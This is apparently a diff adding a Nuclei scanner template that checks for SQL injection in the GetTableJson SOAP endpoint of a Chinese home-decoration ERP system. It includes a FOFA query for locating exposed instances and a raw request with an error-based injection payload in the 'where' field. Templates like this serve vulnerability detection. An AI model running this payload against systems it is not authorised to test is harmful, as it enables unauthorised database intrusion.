@@ -1,0 +1,47 @@
+id: poc-yaml-znfit-erp-ms-gettablejson-sqli
+info:
+  name: 家装ERP管理系统 GetTableJson SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 家装ERP管理系统
+    fofa: body="上海装盟信息科技有限公司"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /WEB_SERVICE/Public.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetTableJson"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetTableJson xmlns="http://tempuri.org/">
+              <tbName>master.dbo.sysdatabases</tbName>
+              <field>1</field>
+              <where>1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))</where>
+            </GetTableJson>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "服务器无法处理请求"
+          - "0x{{t2}}"
+          - "转换成数据类型"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
